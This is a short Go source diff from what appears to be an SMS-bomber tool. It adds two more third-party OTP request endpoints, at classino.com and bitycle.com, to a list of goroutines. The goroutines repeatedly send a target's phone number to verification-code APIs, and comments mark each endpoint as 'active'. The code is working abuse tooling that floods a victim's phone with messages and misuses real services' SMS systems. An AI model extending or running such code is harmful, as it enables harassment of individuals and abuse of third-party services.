@@ -183,6 +183,15 @@ func main() {
 		go sms("https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
 			"mobileNumber": phone,
 		}, ch)  // active ✅
+		go sms("https://app.classino.com/otp/v1/api/send_otp", map[string]interface{}{
+			"mobile": phone,
+		}, ch)  // active ✅
+		go sms("https://api.bitycle.com/api/account/request_otp", map[string]interface{}{
+			"phone": phone,
+		}, ch)  // active ✅
+
+
+
 	for i := 0; i < repeatCount; i++ {
 		statusCode := <-ch
 		if statusCode == 404 || statusCode == 400 {
